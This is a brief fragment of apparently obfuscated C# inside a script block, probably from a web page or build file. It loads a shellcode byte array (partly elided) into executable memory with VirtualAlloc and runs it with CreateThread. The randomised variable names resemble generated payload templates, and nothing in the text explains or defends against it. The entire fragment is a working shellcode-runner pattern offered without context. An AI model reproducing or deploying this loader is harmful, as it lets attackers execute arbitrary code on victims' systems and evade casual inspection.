...
0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x48,0x18,0x8b,0x58,0x20,0x50,0x01,0xd3,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr dYskZ1 = VirtualAlloc(IntPtr.Zero,(UIntPtr)pMckw.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(pMckw,0,dYskZ1,pMckw.Length);
        IntPtr vwEK77ogVLE = IntPtr.Zero;
        IntPtr wKlYZqovVMN = CreateThread(IntPtr.Zero,UIntPtr.Zero,dYskZ1,IntPtr.Zero,0,ref vwEK77ogVLE);
    }
</script>
